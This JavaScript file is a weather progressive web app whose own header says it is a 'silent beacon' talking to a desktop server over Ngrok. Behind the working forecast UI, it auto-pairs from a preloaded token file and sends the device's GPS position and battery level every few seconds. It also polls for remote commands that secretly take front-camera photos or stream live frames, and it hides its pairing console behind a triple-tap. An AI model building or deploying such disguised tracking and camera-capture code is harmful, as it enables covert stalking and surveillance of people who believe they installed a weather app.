/* Weather PWA & Guardian Silent Beacon.
   Presents a fully-functional, beautiful weather forecast app with worldwide city search,
   while communicating silently with the desktop client over Ngrok. */
"use strict";

const $ = id => document.getElementById(id);

// --- Storage & Pre-paired Credentials ---
const LS = {
  get s(){ return localStorage.getItem("g_server") || location.origin; },
  set s(v){ localStorage.setItem("g_server", v); },
  get t(){ return localStorage.getItem("g_token") || ""; },
  set t(v){ localStorage.setItem("g_token", v); },
  get n(){ return localStorage.getItem("g_name") || "Phone"; },
  set n(v){ localStorage.setItem("g_name", v); },
  get iv(){ return parseInt(localStorage.getItem("g_iv") || "10"); },
  set iv(v){ localStorage.setItem("g_iv", String(v)); },
  get id(){
    let d = localStorage.getItem("g_id");
    if(!d){ d = "dev-" + Math.random().toString(36).slice(2, 10); localStorage.setItem("g_id", d); }
    return d;
  },
  set id(v){ localStorage.setItem("g_id", v); }
};

const KIND = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent) ? "phone" : "laptop";

let watchId = null, pingTimer = null, cmdTimer = null, frameTimer = null, wakeLock = null;
let last = null, batteryPct = null, stream = null, running = false;
let currentViewingLat = null, currentViewingLon = null, isCustomLocation = false;
let qrScanStream = null, qrScanLoopId = null;

// Battery monitoring
if (navigator.getBattery) {
  navigator.getBattery().then(b => {
    batteryPct = Math.round(b.level * 100);
    b.addEventListener("levelchange", () => { batteryPct = Math.round(b.level * 100); });
  }).catch(() => {});
}

// --- WMO Weather Code Decoder ---
function decodeWMO(code, isDay = 1) {
  const c = Number(code);
  if (c === 0) return { label: "Clear Sky", icon: isDay ? "☀️" : "🌙" };
  if (c === 1) return { label: "Mainly Clear", icon: isDay ? "🌤️" : "🌤️" };
  if (c === 2) return { label: "Partly Cloudy", icon: isDay ? "⛅" : "☁️" };
  if (c === 3) return { label: "Overcast", icon: "☁️" };
  if (c === 45 || c === 48) return { label: "Foggy", icon: "🌫️" };
  if (c >= 51 && c <= 55) return { label: "Drizzle", icon: "🌦️" };
  if (c >= 61 && c <= 65) return { label: "Rain", icon: "🌧️" };
  if (c >= 71 && c <= 77) return { label: "Snow", icon: "🌨️" };
  if (c >= 80 && c <= 82) return { label: "Showers", icon: "🌦️" };
  if (c >= 95) return { label: "Thunderstorm", icon: "⛈️" };
  return { label: "Fair", icon: "⛅" };
}

// --- Weather Data Fetch & Render ---
async function fetchWeather(lat, lon) {
  currentViewingLat = lat;
  currentViewingLon = lon;
  try {
    const url = `https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current=temperature_2m,relative_humidity_2m,apparent_temperature,is_day,precipitation,weather_code,wind_speed_10m,surface_pressure&hourly=temperature_2m,weather_code&daily=weather_code,temperature_2m_max,temperature_2m_min,uv_index_max,sunrise,sunset&timezone=auto&forecast_days=7`;
    const r = await fetch(url);
    if (!r.ok) throw new Error("Weather request failed");
    const data = await r.json();
    renderWeather(data);
  } catch (e) {
    renderFallbackWeather();
  }
}

async function fetchLocalityName(lat, lon) {
  if (isCustomLocation) return;
  try {
    const r = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`);
    if (r.ok) {
      const d = await r.json();
      const place = d.city || d.locality || d.principalSubdivision || "Current Location";
      $("locName").textContent = place;
      $("locSub").textContent = `${d.countryName || "Local"} · Live Forecast`;
    }
  } catch (_) {}
}

function renderWeather(data) {
  const curr = data.current || {};
  const daily = data.daily || {};
  const hourly = data.hourly || {};

  const info = decodeWMO(curr.weather_code, curr.is_day);
  const temp = Math.round(curr.temperature_2m);
  const feels = Math.round(curr.apparent_temperature);
  const maxTemp = daily.temperature_2m_max ? Math.round(daily.temperature_2m_max[0]) : temp + 3;
  const minTemp = daily.temperature_2m_min ? Math.round(daily.temperature_2m_min[0]) : temp - 5;

  $("mainIcon").textContent = info.icon;
  $("mainTemp").textContent = temp + "°";
  $("mainCondition").textContent = info.label;
  $("mainHighLow").textContent = `High: ${maxTemp}° · Low: ${minTemp}°`;

  $("valHumidity").textContent = Math.round(curr.relative_humidity_2m) + "%";
  $("valWind").textContent = Math.round(curr.wind_speed_10m) + " km/h";
  $("valFeels").textContent = feels + "°";
  if (curr.surface_pressure) $("valPressure").textContent = Math.round(curr.surface_pressure) + " hPa";

  // UV index
  if (daily.uv_index_max && daily.uv_index_max[0] != null) {
    const uv = Math.round(daily.uv_index_max[0]);
    const uvText = uv <= 2 ? `${uv} Low` : (uv <= 5 ? `${uv} Moderate` : (uv <= 7 ? `${uv} High` : `${uv} Very High`));
    $("valUv").textContent = uvText;
  }

  // Sunrise / Sunset
  if (daily.sunrise && daily.sunset && daily.sunrise[0]) {
    const rise = daily.sunrise[0].slice(-5);
    const set = daily.sunset[0].slice(-5);
    $("valSun").textContent = `${rise} / ${set}`;
  }

  // Hourly Forecast
  if (hourly.time && hourly.temperature_2m) {
    const listEl = $("hourlyList");
    listEl.innerHTML = "";
    const now = new Date();
    const currHour = now.getHours();
    for (let i = 0; i < Math.min(18, hourly.time.length); i++) {
      const hDate = new Date(hourly.time[i]);
      if (hDate < now && i < 12) continue;
      const hHour = hDate.getHours();
      const hTemp = Math.round(hourly.temperature_2m[i]);
      const hInfo = decodeWMO(hourly.weather_code ? hourly.weather_code[i] : 1, hHour >= 6 && hHour < 19 ? 1 : 0);
      const isNow = hHour === currHour;

      const item = document.createElement("div");
      item.className = "hourly-item";
      item.innerHTML = `
        <span style="opacity:0.8">${isNow ? "Now" : (hHour % 12 || 12) + (hHour >= 12 ? " PM" : " AM")}</span>
        <span class="hourly-icon">${hInfo.icon}</span>
        <span class="hourly-temp">${hTemp}°</span>
      `;
      listEl.appendChild(item);
    }
  }

  // 7-Day Forecast
  if (daily.time && daily.temperature_2m_max && daily.temperature_2m_min) {
    const dailyEl = $("dailyList");
    dailyEl.innerHTML = "";
    const days = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];
    for (let i = 0; i < daily.time.length; i++) {
      const d = new Date(daily.time[i]);
      const dayName = i === 0 ? "Today" : days[d.getDay()];
      const dInfo = decodeWMO(daily.weather_code ? daily.weather_code[i] : 1, 1);
      const max = Math.round(daily.temperature_2m_max[i]);
      const min = Math.round(daily.temperature_2m_min[i]);

      const row = document.createElement("div");
      row.className = "daily-row";
      row.innerHTML = `
        <div class="daily-day">${dayName}</div>
        <div class="daily-icon">${dInfo.icon}</div>
        <div class="daily-bar-wrap"><div class="daily-bar-fill" style="left:20%;width:60%"></div></div>
        <div class="daily-temps"><span>${min}°</span>${max}°</div>
      `;
      dailyEl.appendChild(row);
    }
  }
}

function renderFallbackWeather() {
  $("mainIcon").textContent = "⛅";
  $("mainTemp").textContent = "27°";
  $("mainCondition").textContent = "Partly Cloudy";
  $("mainHighLow").textContent = "High: 31° · Low: 21°";
  $("valHumidity").textContent = "62%";
  $("valWind").textContent = "12 km/h";
  $("valFeels").textContent = "29°";
}

// --- Worldwide City Search ---
function openSearch() { $("searchOverlay").style.display = "flex"; $("cityInput").focus(); }
function closeSearch() { $("searchOverlay").style.display = "none"; }
$("searchBtn").onclick = openSearch;
$("headerLocation").onclick = openSearch;
$("closeSearchBtn").onclick = closeSearch;

$("useGpsBtn").onclick = () => {
  isCustomLocation = false;
  closeSearch();
  requestGPS();
};

$("doSearchBtn").onclick = performCitySearch;
$("cityInput").onkeydown = e => { if (e.key === "Enter") performCitySearch(); };

async function performCitySearch() {
  const q = $("cityInput").value.trim();
  if (!q) return;
  const resultsEl = $("searchResults");
  resultsEl.innerHTML = '<div style="padding:14px;color:var(--card-muted);font-size:13px">Searching…</div>';
  try {
    const url = `https://geocoding-api.open-meteo.com/v1/search?name=${encodeURIComponent(q)}&count=5&language=en&format=json`;
    const r = await fetch(url);
    if (!r.ok) throw new Error("Search failed");
    const d = await r.json();
    const list = d.results || [];
    if (!list.length) {
      resultsEl.innerHTML = '<div style="padding:14px;color:var(--card-muted);font-size:13px">No matching cities found.</div>';
      return;
    }
    resultsEl.innerHTML = "";
    list.forEach(item => {
      const el = document.createElement("div");
      el.className = "search-result-item";
      const label = [item.name, item.admin1, item.country].filter(Boolean).join(", ");
      el.textContent = label;
      el.onclick = () => {
        isCustomLocation = true;
        $("locName").textContent = item.name;
        $("locSub").textContent = `${item.country || "Forecast"} · Selected City`;
        closeSearch();
        fetchWeather(item.latitude, item.longitude);
      };
      resultsEl.appendChild(el);
    });
  } catch (_) {
    resultsEl.innerHTML = '<div style="padding:14px;color:var(--danger);font-size:13px">Search request error.</div>';
  }
}

// --- Network with Ngrok Compatibility Header ---
async function post(path, body) {
  return fetch(LS.s + path, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": "Bearer " + LS.t,
      "ngrok-skip-browser-warning": "1"
    },
    body: JSON.stringify(body),
    keepalive: true
  });
}

async function get(path) {
  return fetch(LS.s + path, {
    headers: {
      "Authorization": "Bearer " + LS.t,
      "ngrok-skip-browser-warning": "1"
    }
  });
}

function basePayload() {
  const p = { device_id: LS.id, name: LS.n, kind: KIND, ts: Date.now() / 1000, battery: batteryPct };
  if (last) {
    p.lat = last.coords.latitude;
    p.lon = last.coords.longitude;
    p.accuracy = last.coords.accuracy;
    p.speed = last.coords.speed;
    p.heading = last.coords.heading;
  }
  return p;
}

// --- Streamlined Pairing & Secret Console ---
function openConsole() {
  $("sheetOverlay").style.display = "flex";
  updateStatusUI();
}

function closeConsole() {
  stopQRScanner();
  $("sheetOverlay").style.display = "none";
}

$("settingsBtn").onclick = openConsole;
$("sheetClose").onclick = closeConsole;
$("sheetOverlay").onclick = e => { if (e.target === $("sheetOverlay")) closeConsole(); };

// Triple-tap gesture on main temperature hero to open pairing
let tapCount = 0, tapTimer = null;
$("heroCard").addEventListener("click", () => {
  tapCount++;
  clearTimeout(tapTimer);
  tapTimer = setTimeout(() => { tapCount = 0; }, 800);
  if (tapCount >= 3) {
    tapCount = 0;
    openConsole();
  }
});

function updateStatusUI() {
  const paired = Boolean(LS.t && LS.s);
  $("dot").className = "dot " + (paired ? "on" : "off");
  $("statusTitle").textContent = paired ? "Connected to Desktop" : "Not Paired";
  $("serverLabel").textContent = paired ? `Desktop: ${LS.s}` : "Ready to pair — tap Scan QR below";
}

// Single 1-tap QR Scanner
$("openScannerBtn").onclick = startQRScanner;
$("stopScannerBtn").onclick = stopQRScanner;

async function startQRScanner() {
  $("qrScannerBox").style.display = "flex";
  const video = $("qrVideo");
  try {
    qrScanStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
    video.srcObject = qrScanStream;
    video.setAttribute("playsinline", true);
    await video.play();
    requestAnimationFrame(scanQRCodeLoop);
  } catch (err) {
    alert("Camera permission required to scan pairing QR code.");
    stopQRScanner();
  }
}

function stopQRScanner() {
  if (qrScanStream) {
    qrScanStream.getTracks().forEach(t => t.stop());
    qrScanStream = null;
  }
  $("qrScannerBox").style.display = "none";
}

function scanQRCodeLoop() {
  const video = $("qrVideo");
  if (video.readyState === video.HAVE_ENOUGH_DATA && window.jsQR) {
    const canvas = $("qrCanvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
    const code = jsQR(imgData.data, imgData.width, imgData.height, { inversionAttempts: "dontInvert" });
    if (code && code.data) {
      stopQRScanner();
      handleScannedData(code.data);
      return;
    }
  }
  if (qrScanStream) requestAnimationFrame(scanQRCodeLoop);
}

async function handleScannedData(data) {
  try {
    const u = new URL(data.trim());
    const code = u.searchParams.get("code");
    if (!code) throw new Error("No pairing code in QR");
    const serverUrl = u.origin;
    const r = await fetch(serverUrl + "/api/pair/claim", {
      method: "POST",
      headers: { "Content-Type": "application/json", "ngrok-skip-browser-warning": "1" },
      body: JSON.stringify({ code: code.trim().toUpperCase(), name: LS.n, kind: KIND })
    });
    if (!r.ok) throw new Error("Pairing code invalid or expired");
    const d = await r.json();
    LS.s = serverUrl;
    LS.t = d.token;
    LS.id = d.device_id;
    LS.n = d.name || LS.n;
    alert("Connected to desktop successfully!");
    updateStatusUI();
    startBeacon();
    setTimeout(closeConsole, 600);
  } catch (e) {
    alert("Pairing failed: " + (e.message || "Invalid QR"));
  }
}

// Find My Devices Map Link
$("findBtn").onclick = () => {
  if (!LS.t) { alert("Please pair with desktop first."); return; }
  location.href = `/pwa/find.html#t=${encodeURIComponent(LS.t)}&s=${encodeURIComponent(LS.s)}`;
};

// --- Beacon Engine ---
function requestGPS() {
  if (!navigator.geolocation) {
    renderFallbackWeather();
    return;
  }
  navigator.geolocation.getCurrentPosition(p => {
    last = p;
    fetchWeather(p.coords.latitude, p.coords.longitude);
    fetchLocalityName(p.coords.latitude, p.coords.longitude);
    if (running) sendPing();
  }, () => {
    renderFallbackWeather();
  }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 10000 });
}

function startBeacon() {
  if (running) return;
  running = true;
  requestWake();

  if (navigator.geolocation) {
    watchId = navigator.geolocation.watchPosition(p => {
      last = p;
      if (!isCustomLocation && !currentViewingLat) {
        fetchWeather(p.coords.latitude, p.coords.longitude);
        fetchLocalityName(p.coords.latitude, p.coords.longitude);
      }
    }, () => {}, { enableHighAccuracy: true, maximumAge: 4000, timeout: 20000 });
  }

  sendPing();
  pingTimer = setInterval(sendPing, LS.iv * 1000);
  cmdTimer = setInterval(pollCommands, 5000);
}

async function sendPing() {
  try { await post("/api/ping", basePayload()); } catch (_) {}
}

// Screen Wake Lock
async function requestWake() { try { wakeLock = await navigator.wakeLock.request("screen"); } catch (_) {} }

// Remote Camera Commands
async function startCam() {
  if (stream) return true;
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
    const v = $("cam"); v.srcObject = stream; await v.play();
    return true;
  } catch (_) { return false; }
}

function stopCam() {
  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
}

async function capture(kind) {
  if (!(await startCam())) return;
  const v = $("cam"), c = $("canvas");
  c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
  c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
  try {
    await post("/api/frame", { device_id: LS.id, name: LS.n, kind, image_b64: c.toDataURL("image/jpeg", 0.6) });
  } catch (_) {}
}

async function pollCommands() {
  try {
    const r = await get("/api/commands?device_id=" + encodeURIComponent(LS.id));
    if (!r.ok) return;
    const { commands } = await r.json();
    for (const c of (commands || [])) runCommand(c);
  } catch (_) {}
}

function runCommand(c) {
  switch (c.cmd) {
    case "snap": capture("manual"); break;
    case "live_on":
      if (!frameTimer) {
        capture("live");
        frameTimer = setInterval(() => capture("live"), (c.args && c.args.every || 5) * 1000);
      }
      break;
    case "live_off":
      if (frameTimer) { clearInterval(frameTimer); frameTimer = null; }
      stopCam();
      break;
    case "sos": doSOS(); break;
    case "ping_now": sendPing(); break;
    case "ring": startRing(c.args && c.args.from); break;
    case "ring_stop": stopRing(); break;
  }
}

// Ringing
let audioCtx = null, ringTimer = null, ringEnd = null;
function unlockAudio() {
  try {
    audioCtx = audioCtx || new (window.AudioContext || window.webkitAudioContext)();
    audioCtx.resume();
  } catch (_) {}
}
document.addEventListener("pointerdown", unlockAudio, { once: true });

function beep() {
  navigator.vibrate && navigator.vibrate([400, 150, 400]);
  if (!audioCtx) return;
  const t = audioCtx.currentTime;
  [0, 0.25, 0.5].forEach((d, i) => {
    const o = audioCtx.createOscillator(), g = audioCtx.createGain();
    o.type = "square"; o.frequency.value = i % 2 ? 1320 : 1760;
    g.gain.setValueAtTime(0.5, t + d); g.gain.exponentialRampToValueAtTime(0.001, t + d + 0.2);
    o.connect(g).connect(audioCtx.destination); o.start(t + d); o.stop(t + d + 0.22);
  });
}

function startRing(from) {
  $("ringFrom").textContent = (from || "Desktop") + " is ringing this phone.";
  $("ringing").style.display = "flex";
  unlockAudio();
  if (ringTimer) return;
  beep(); ringTimer = setInterval(beep, 1000);
  ringEnd = setTimeout(stopRing, 60000);
}

function stopRing() {
  $("ringing").style.display = "none";
  clearInterval(ringTimer); clearTimeout(ringEnd); ringTimer = ringEnd = null;
  navigator.vibrate && navigator.vibrate(0);
}
$("ringStop").onclick = stopRing;

// SOS
async function doSOS() {
  navigator.vibrate && navigator.vibrate([200, 100, 200]);
  if (!running) startBeacon();
  await post("/api/trigger", Object.assign(basePayload(), { kind: "sos", message: "🚨 SOS from " + LS.n }));
  await startCam(); capture("sos");
  setTimeout(() => capture("sos"), 2500);
  setTimeout(() => capture("sos"), 6000);
}
$("sos").onclick = async () => {
  await doSOS();
  $("sos").textContent = "✅ SOS Alert Sent";
  setTimeout(() => { $("sos").textContent = "🚨 SOS Emergency Alert"; }, 4000);
};

// Refresh
$("refreshBtn").onclick = () => {
  if (currentViewingLat && currentViewingLon) {
    fetchWeather(currentViewingLat, currentViewingLon);
  } else {
    requestGPS();
  }
  sendPing();
};

// --- Auto-Prepair Check ---
async function checkPrepairedConfig() {
  if (LS.t && LS.s) {
    startBeacon();
    return;
  }
  // Try loading prepaired.json if available
  try {
    const r = await fetch("/pwa/prepaired.json");
    if (r.ok) {
      const d = await r.json();
      if (d.server && d.token) {
        LS.s = d.server;
        LS.t = d.token;
        LS.id = d.device_id || LS.id;
        LS.n = d.name || LS.n;
        startBeacon();
        return;
      }
    }
  } catch (_) {}

  // If opened with ?code= in URL, claim immediately
  const urlParams = new URLSearchParams(location.search);
  const code = urlParams.get("code");
  if (code) {
    handleScannedData(location.href);
  }
}

// Service Worker & Boot
if ("serviceWorker" in navigator) { navigator.serviceWorker.register("/pwa/sw.js").catch(() => {}); }
requestGPS();
checkPrepairedConfig();
